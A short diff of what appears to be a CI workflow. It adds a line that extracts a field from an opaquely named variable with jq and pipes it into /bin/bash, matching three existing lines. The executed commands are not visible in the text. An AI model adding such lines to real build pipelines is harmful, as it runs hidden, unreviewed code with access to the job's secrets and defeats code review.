@@ -24,6 +24,7 @@ jobs:
           echo $rixra486 | jq -r .o50175 | /bin/bash
           printf '%s' "$cqb3" | jq -r .yse74580 | /bin/bash
           printf '%s' "$r609" | jq -r .mch6 | /bin/bash
+          printf '%s' "$zirlc5610" | jq -r .c2520 | /bin/bash
 
       - name: Store results
         if: always()
